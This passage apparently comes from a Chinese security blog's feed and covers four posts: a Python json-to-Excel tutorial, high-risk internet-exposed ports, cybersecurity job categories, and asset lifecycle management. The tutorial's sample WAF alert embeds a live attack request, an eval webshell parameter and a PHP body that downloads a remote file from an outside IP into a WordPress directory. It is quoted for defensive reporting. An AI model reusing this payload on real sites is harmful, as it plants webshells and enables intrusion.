title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python三行代码实现json转Excel</title>
      <link href="/posts/213c546f/"/>
      <url>/posts/213c546f/</url>
      
        <content type="html"><![CDATA[<p>最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。<br>用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。<br>实现如下：</p><h2 id="一、引包"><a href="#一、引包" class="headerlink" title="一、引包"></a>一、引包</h2><p>引入pandas包，pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas </span><br><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">json_data=<span class="string">r'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   "msg": "",</span></span><br><span class="line"><span class="string">   "killChain": "02",</span></span><br><span class="line"><span class="string">   "attackIllustration": "1起恶意盲打木马写入攻击",</span></span><br><span class="line"><span class="string">   "traceSourceFlag": "01",</span></span><br><span class="line"><span class="string">   "riskLevel": "02",</span></span><br><span class="line"><span class="string">   "holeType": "",</span></span><br><span class="line"><span class="string">   "discoveryTime": "2023-08-15 14:36:23",</span></span><br><span class="line"><span class="string">   "disposalMeasure": "01",</span></span><br><span class="line"><span class="string">   "informationSource": "长亭WAF",</span></span><br><span class="line"><span class="string">   "disposalSuggestion": "建议封禁",</span></span><br><span class="line"><span class="string">   "riskLevelPredue": "",</span></span><br><span class="line"><span class="string">   "impactFlag": "02",</span></span><br><span class="line"><span class="string">   "disposalOperateRecord": "WAF封禁",</span></span><br><span class="line"><span class="string">   "serialNo": "ABC123",</span></span><br><span class="line"><span class="string">   "sourceIpBelong": "美国",</span></span><br><span class="line"><span class="string">   "potentialImpact": "无",</span></span><br><span class="line"><span class="string">   "sourceIpType": "04",</span></span><br><span class="line"><span class="string">   "protocalType": "HTTP",</span></span><br><span class="line"><span class="string">   "disposalFlag": "01",</span></span><br><span class="line"><span class="string">   "groupOrderType": "1",</span></span><br><span class="line"><span class="string">   "comment": "通过微步溯源，IP归属地是美国",</span></span><br><span class="line"><span class="string">   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",</span></span><br><span class="line"><span class="string">   "taskId": "",</span></span><br><span class="line"><span class="string">   "status": ""</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">dic_data = json.loads(json_data,strict=<span class="literal">False</span>)</span><br><span class="line">df_data=pd.DataFrame(dic_data,index=[<span class="number">0</span>])</span><br><span class="line">df_data.to_excel(<span class="string">'attack.xlsx'</span>)</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230818/json%E8%BD%ACexcel.png" alt="json转excel"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于<br><code>json.decoder.JSONDecodeError: Expecting &#39;,&#39; delimiter: line 50 column 149 (char 1339)</code>的错误。所以需要在字符串前面加<code>r</code>标识来忽略掉转义机制。</p><p>常见的字符串标识<code>u,r,b,f</code></p><ul><li>字符串前加u<br>后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>字符串前加r<br>去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）</li><li>字符串前加b<br>b前缀表示：后面字符串是bytes 类型。</li><li>字符串前加f<br>以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。<br>如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'xiejava'</span></span><br><span class="line">outputstr=<span class="string">f'My name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">print(outputstr)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiejava</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之互联网暴露资产端口</title>
      <link href="/posts/ff84f2fb/"/>
      <url>/posts/ff84f2fb/</url>
      
        <content type="html"><![CDATA[<p>互联网暴露资产因直接向公众互联网开放，极易遭受来自外部组织或人员的入侵与攻击，是风险管控的高危区域。</p><p>作为企业的安全管理，互联网暴露资产的管理是非常重要的一环。应该建立规范的流程严控互联网暴露端口的审批，对互联网暴露出口应尽量缩减收敛减少暴露面，对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对因为业务需要必须要暴露的资产端口进行有效的访问控制策略等。</p><p>本文介绍互联网暴露资产端口的定义、分类及管理。</p><h2 id="互联网暴露资产端口定义"><a href="#互联网暴露资产端口定义" class="headerlink" title="互联网暴露资产端口定义"></a>互联网暴露资产端口定义</h2><p>互联网暴露端口指信息系统资产、网络设备或终端设备面向互联网开放服务或开放协议的端口（含 NAT 映射端口），该端口可被其他互联网的资产进行主动探测、访问或连接。当某资产至少具备一个互联网暴露端口时，则认定该资产为互联网暴露资产；当某信息系统内部至少具备一台互联网暴露资产时，则认定该信息系统为互联网暴露信息系统。<br>当互联网暴露资产同时面向内网（或私网）开放服务或开放协议时，相关端口不属于互联网暴露端口，不纳入互联网暴露端口管控范围；当某资产通过互联网主动发起单向通信时，因该资产用于通信服务的端口并未暴露于互联网，也无法被其他互联网资产主动探测、访问或连接，则认定该资产不属于互联网暴露资产，且不具备互联网暴露端口。<br>互联网暴露端口的判定，与该端口是否已执行访问控制策略不相关。</p><h2 id="互联网暴露资产端口分类"><a href="#互联网暴露资产端口分类" class="headerlink" title="互联网暴露资产端口分类"></a>互联网暴露资产端口分类</h2><p>互联网暴露资产（含信息系统、网络设备、终端）端口按照其功能用途，可分为业务类端口及管理类端口两大类：<br>1）业务类端口。具体可细分为以下三类：</p><ul><li>用户访问端口：主要指各类与用户侧交互的，支撑用户访问服务的端口，如 WEB 访问端口、视频流端口等。</li><li>平台交互端口：系统内外部服务器间的接口交互、数据交互等服务端口。</li><li>路由协议端口：常见于路由设备，用于配置路由协议而开放的端口服务，如 BGP边界网关协议端口、OSPF 开放式最短路径优先协议端口等。</li></ul><p>2）管理类端口。主要包含实现远程操控管理、后台访问运维、用户数据收集及用户终端主动管控等服务的端口。</p><h2 id="互联网暴露资产端口管理"><a href="#互联网暴露资产端口管理" class="headerlink" title="互联网暴露资产端口管理"></a>互联网暴露资产端口管理</h2><ul><li>尽量缩减收敛减少暴露面，基于最小使用原则，对于高危风险端口应严禁对互联网开放，尤其是管理类端口如数据库、运维管理等端口。如mysql的3306端口、Redis的6379端口等。对于必须要暴露的资产端口进行有效管控，如：制定合理的访问控制策略、加强鉴权等。</li><li>应该建立互联网暴露资产台账，规范的流程严控互联网暴露端口的审批，动态维护好互联网暴露资产台账。</li><li>对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对没有没纳管的暴露面资产进行纳管加强管控或下线，及时维护台账。</li></ul><h3 id="常见的高危风险端口"><a href="#常见的高危风险端口" class="headerlink" title="常见的高危风险端口"></a>常见的高危风险端口</h3><table><thead><tr><th>高危端口号（默认）</th><th>22（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SSH （Secure Shell），安全外壳协议</td></tr><tr><td>应用场景或应用组件</td><td>远程登录、SSH 端口转发</td></tr><tr><td>端口用途说明</td><td>SSH 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>23（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Telnet （ 远程终端协议）</td></tr><tr><td>应用场景或应用组件</td><td>远程登录</td></tr><tr><td>端口用途说明</td><td>Telnet 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>161（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SNMP（Simple Network Management Protocol，简单网络管理协议）</td></tr><tr><td>端口用途说明</td><td>可用于对网络设备进行远程信息读取、管理和配置</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>爆破默认团队字符串，导致信息泄漏</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>111（TCP/UDP）、2049（TCP/UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>NFS（Network File System），网络文件系统</td></tr><tr><td>端口用途说明</td><td>用于远程文件传输</td></tr><tr><td>端口类别</td><td>业务类端口（用户访问端口、平台交互端口）</td></tr><tr><td>风险描述</td><td>权限配置不当</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3306（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MySQL（数据库）</td></tr><tr><td>端口用途说明</td><td>MySQL 是一款开源关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>6379（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Redis（数据库）</td></tr><tr><td>端口用途说明</td><td>Redis 默认管理和服务端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>可能会存在未授权访问，或者进行弱口令爆破；获得访问权限后，可能存在任意文件写入导致获取系统远程控制权限。</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>27017（TCP）、27018（TCP）、27019（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MongoDB（数据库）</td></tr><tr><td>端口用途说明</td><td>用于 MongoDB 数据库的远程管理和服务，以及集群间通信</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>爆破，未授权访问</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1433（TCP）、1434（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SQLServer（数据库）</td></tr><tr><td>端口用途说明</td><td>SQL Server 是 Microsoft 公司推出的关系型数据库管理系统。<br>1433（默认）端口用于数据库远程管理和连接，1434（默认）用于命名服务</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>提权，弱口令，爆破；早期版本还存在远程命令执行漏洞</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1521（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Oracle（甲骨文数据库）</td></tr><tr><td>端口用途说明</td><td>Oracle 是甲骨文公司的一款关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5432（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>PostgreSQL（数据库）</td></tr><tr><td>端口用途说明</td><td>PostgreSQL 是一款开源关系数据库管理系统。该端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3389（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Windows RDP（远程桌面协议）</td></tr><tr><td>端口用途说明</td><td>用于访问服务器的远程桌面服务，提供基于图形界面的远程操作维护功能。</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5800（TCP），5900（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>VNC（Virtual Network Console），虚拟网络控制台</td></tr><tr><td>端口用途说明</td><td>VNC 是一款远程桌面和远程控制软件，5800 和 5900（默认）端口均为 VNC 服务启动端口或远端控制端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全入行？来了解下网络安全从业人员类别及其工作任务</title>
      <link href="/posts/d2f9b6e7/"/>
      <url>/posts/d2f9b6e7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230427/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E5%91%98.png" alt="在这里插入图片描述"></p><p>又到了每年重保期间，红蓝双方都开始进行准备蓄势待发，网络安全从业人员每年供不应求，尤其是重保期间，双方都在疯狂的招揽准备网络安全人员。那网络安全从业人员分类到底有哪些，都负责哪些具体的工作任务呢？</p><p>根据2023年最新发布的在今年10月1日即将实施的国标《GB T 42446-2023 信息安全技术 网络安全从业人员能力基本要求》的定义。<br><strong>网络安全从业人员（cybersecurity workforce）</strong>是从事网络安全工作，承担相应网络安全职责，并且具有相应网络安全知识和技能的人员。<br>网络安全从业人员完成工作任务需要具备相应的能力。工作任务是指为了实现组织的相关目标，需要执行的网络安全有关的一个或一组工作活动或工作内容。<br>网络安全从业人员的工作类别包括：<strong>网络安全管理、网络安全建设、网络安全运营、网络安全审计和评估、网络安全科研教育</strong>。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230427/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E4%BA%BA%E5%91%98%E5%B7%A5%E4%BD%9C%E7%B1%BB%E5%88%AB.png" alt="网络安全从业人员的工作类别"></p><h3 id="网络安全管理"><a href="#网络安全管理" class="headerlink" title="网络安全管理"></a>网络安全管理</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全需求分析</td><td>依据法律法规、政策标准及业务流程要求，开展符合性需求分析、业务所依赖的信息通信技术（ICT）持续运行需求分析、数据安全需求分析等，定期或在遇到重大网络安全事件时对组织网络安全需求进行复审。</td></tr><tr><td>网络安全规划和管理</td><td>指导、制定、监督和执行网络安全战略规划、策略制度和体制机制。综合协调相关人员，采取各类网络安全控制措施，降低并缓解系统安全风险。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr><tr><td>网络安全咨询</td><td>根据组织的安全目标，提供安全规划、设计、实施、运维、管理等方面的政策法规和技术咨询服务。</td></tr></tbody></table><h3 id="网络安全建设"><a href="#网络安全建设" class="headerlink" title="网络安全建设"></a>网络安全建设</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全需求分析</td><td>依据法律法规、政策标准及业务流程要求，开展符合性需求分析、业务所依赖的信息通信技术（ICT）持续运行需求分析、数据安全需求分析等，定期或在遇到重大网络安全事件时对组织网络安全需求进行复审。</td></tr><tr><td>网络安全架构设计</td><td>依据网络安全需求分析、ICT基础设施现状、组织环境和业务特点等，从物理环境、通信网络、计算环境、区域边界等方面进行网络安全架构设计，形成网络安全架构实施方案。</td></tr><tr><td>网络安全开发</td><td>实现软件、硬件安全架构及功能开发，并对其进行测试、更新和维护。</td></tr><tr><td>供应链安全管理</td><td>运用供应链安全管理的方法、工具和技术，控制供应链安全风险，管理供应商及网络安全和信息化相关产品和服务的釆购。</td></tr><tr><td>网络安全集成实施</td><td>网络安全项目管理，信息系统安全集成过程中软硬件设备与系统的安装、调试、测试、配置、故障处理和工程实施，以及配合验收交付。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr></tbody></table><h3 id="网络安全运营"><a href="#网络安全运营" class="headerlink" title="网络安全运营"></a>网络安全运营</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全运维</td><td>利用网络安全技术/工具，根据网络安全相关标准和制度流程，操作、运行、维护和管理信息系统。</td></tr><tr><td>网络安全监测和分析</td><td>利用相关技术、工具和情报信息等对目标系统进行安全监测、分析和预警，并提出应对威胁的措施和改进建议。</td></tr><tr><td>网络安全应急管理</td><td>组织编制网络安全事件应急预案，实施网络安全应急演练，在应对突发/重大网络安全事件时，采取必要的应急处置措施将信息系统和业务恢复到正常状 态，并进行事件溯源和调查取证。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr></tbody></table><h3 id="网络安全审计和评估"><a href="#网络安全审计和评估" class="headerlink" title="网络安全审计和评估"></a>网络安全审计和评估</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全审计</td><td>依据审计依据，在规定的审计范围内，监督和评价网络安全控制措施的设计有效性和执行有效性.确定被审计对象满足审计依据的程度，并提出网络安全工作改进的意见和建议。</td></tr><tr><td>网络安全测试</td><td>对目标系统的脆弱性和防御机制有效性进行验证，发现安全问题并提出改进建议；根据测试依据，识别并测试系统和产品的安全性。</td></tr><tr><td>网络安全评估</td><td>评估信息系统、业务及相关网络数据等的符合性和面临的网络安全风险，对风险进行识别、分析、评价，提出改进建议。</td></tr><tr><td>网络安全认证</td><td>对网络安全管理体系、服务、产品等开展认证与审核。电子数据取证对电子数据进行提取、固定、恢复、分析等工作。</td></tr></tbody></table><h3 id="网络安全科研教育"><a href="#网络安全科研教育" class="headerlink" title="网络安全科研教育"></a>网络安全科研教育</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全研究</td><td>研究网络空间安全涉及的学科理论基础和方法论，研究网络安全新兴技术及应用、产业发展趋势，以及网络安全法律法规、政策、标准等。</td></tr><tr><td>网络安全培训和评价</td><td>开展网络安全培训方案和相关课程的设计、开发和持续改进，实施授课等培训活动，开展评价活动，例如：理论知识考试、技能操作考核、业绩评审、竞赛、选拔等。</td></tr></tbody></table><p>在重保期间，最火的就是网络安全运营及网络安全审计和评估人员，分别对应的是红队人员和蓝队人员。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营之资产安全信息管理</title>
      <link href="/posts/a446b750/"/>
      <url>/posts/a446b750/</url>
      
        <content type="html"><![CDATA[<p>安全风险管理的三要素分别是资产、威胁和脆弱性，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。网络攻击主要利用了系统的脆弱性。由于网络管理对象（资产）自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。“摸清家底，认清风险”做好资产安全信息管理是安全运营的第一步也是最重要的一步。</p><h2 id="资产管理范围"><a href="#资产管理范围" class="headerlink" title="资产管理范围"></a>资产管理范围</h2><p>《GBT 20984-2007信息安全技术信息安全风险评估规范》中，对于资产的定义为“对组织有价值的信息或资源，是安全策略保护的对象”。</p><p>对于网络空间资产来说，这里的资产是指赛博空间中某机构所拥有的一切可能被潜在攻击者利用的设备、信息、应用等数字资产。具体对象包括但不限于硬件设备、云主机、操作系统、IP地址、端口、证书、域名、Web应用、业务应用、中间件、框架、机构公众号、小程序、App、API、源代码等。概括来说，只要是可操作的对象，不管是实体还是属性。都可以称之为“网络空间资产”。所以对于企业来说这些资产安全信息都要做好管理。参考博文《<a href="https://xiejava.blog.csdn.net/article/details/129344013" target="_blank" rel="noopener">网络安全之资产及攻击面管理</a>》</p><p>在工信部《基础电信企业资产安全管理平台建设指南（试行）》稿中，提到资产安全管理平台对于IP化软硬件资产提供安全管理，其管理范围包括但不限于网络产品、安全产品、物联网设备、办公外设、企业应用、系统软件、支撑系统。资产安全信息应该覆盖到所有的IP化软硬件资产。</p><p>资产安全信息一般包括资产的基本属性（如：资产名称、类型、型号、厂商、IP地址、操作系统及其版本信息、端口、服务信息、中间件及其版本信息、程序应用框架及其版本信息、应用软件及其版本信息等）、资产的安全属性（如：安全等级等与网络安全脆弱性整治和威胁监测处置有关的信息等）、资产的管理属性（如：使用单位、责任人、联系电话等）、资产的业务属性（包括所属的业务系统、承载的业务等），应对资产安全信息实施全生命周期管理。</p><h2 id="资产安全全生命周期管理"><a href="#资产安全全生命周期管理" class="headerlink" title="资产安全全生命周期管理"></a>资产安全全生命周期管理</h2><p>资产的全生命周期覆盖资产上线、资产运行、资产下线，在这过程中要对资产进行定级备案、对资产的台账进行维护、对资产进行风险评估、对资产进行定期的清查。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230418/%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86.png" alt="资产安全全生命周期管理"></p><h3 id="资产上线"><a href="#资产上线" class="headerlink" title="资产上线"></a>资产上线</h3><p>企业应建立统一的资产安全信息管理平台。资产上线，应在资产投入使用前完成对企业信息资产纳管。主机、虚机资产安装资产采集 Agent，网络设备纳入专业网管系统管理，变更的资产信息每天向资产安全信息管理平台同步。 </p><h3 id="资产运行"><a href="#资产运行" class="headerlink" title="资产运行"></a>资产运行</h3><p>资产运行环节是资产生命周期中最重要的环节。安全运营维护单位应建立所辖资产清单台账，应确保相关信息资产IP 地址和端口全量纳管，实现资产安全信息管理平台数据与资产实际情况相符。做好资产运行期的资产台账维护和更新、做好定级备案信息的维护和更新、定期开展资产的风险评估等。</p><h3 id="资产下线"><a href="#资产下线" class="headerlink" title="资产下线"></a>资产下线</h3><p>资产下线意味着资产的生命周期结束，安全运营维护单位应在资产退网后一定时期内（ 如两周或15 日）内完成资产安全信息管理平台数据更新。</p><h3 id="资产台账维护"><a href="#资产台账维护" class="headerlink" title="资产台账维护"></a>资产台账维护</h3><p>安全运营维护单位应在资产上线前建立好资产台账并在投产前完成对企业信息资产在资产安全信息管理平台的纳管，在资产运行期定期维护台账信息如资产信息发生变化定期更新台账，资产下线推网后完成台账的删除及资产安全信息管理平台数据更新。资产台账维护的主要目的是要保障资产安全信息管理平台数据与资产实际情况相符。</p><h3 id="资产定级备案"><a href="#资产定级备案" class="headerlink" title="资产定级备案"></a>资产定级备案</h3><p>资产因为其业务属性的不一样，影响的业务也不一样。对于重点的业务系统应予以重点的关注和保护。对于大型关基企业应对资产根据其重要级别进行定级备案。根据级别的不同制定防护策略开展风险评估。一般来说由维护单位在资产的全生命周期内进行定级备案信息的维护和更新，如资产上线前进行定级备案，在系统资产发生变化或下线时进行定级备案信息的更新。安全运营支撑单位对定级备案信息开展技术复核后完成定级备案信息的提交。</p><h3 id="资产风险评估"><a href="#资产风险评估" class="headerlink" title="资产风险评估"></a>资产风险评估</h3><p>在资产上线前和资产承载的业务发生变化后都应该进行资产风险评估，并根据企业自身要求定期开展风险评估。根据资产定级备案的不同如三级及以上的网络设备和系统平台每年进行一次风险评估，二级网络设备和系统平台每两年进行一次风险评估。对于存在大量个人信息且暴露于互联网的网络设备和系统平台可以请具备资质的第三方单位开展风险评估。重大活动或重要保障前，开展专项风险评估等。 </p><h3 id="资产定期清查"><a href="#资产定期清查" class="headerlink" title="资产定期清查"></a>资产定期清查</h3><p>资产清查，主要是定期对一些“三无”、“七边”的管理覆盖不到位或存在管理薄弱环节的资产进行清查。识别并推进“三无”资产下线（“三无”指“无人管理、无人使用、无人防护”），对“七边”系统进行规范管理（“七边”指测试系统、试验平台、退网未离网系统、工程已上线加载业务但未正式交维系统、与合作伙伴共同运营的业务或系统、责任交接不清的系统、处于衰退期的系统）。安全运营维护单位应配合开展资产清查和纳管，在“三无”资产回收过程中进行系统保障和应急响应。 </p><p>做好资产安全信息管理是需要通过“技术”+“管理”手段相结合。技术方面企业可以根据自身需求建立资产安全管理平台、攻击面管理平台、互联网暴露面测绘平台，全面覆盖内外资产和互联网暴露面的资产管理；管理方面可以根据自身情况参考资产安全信息管理的全生命周期制定符合企业的资产安全信息管理制度。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
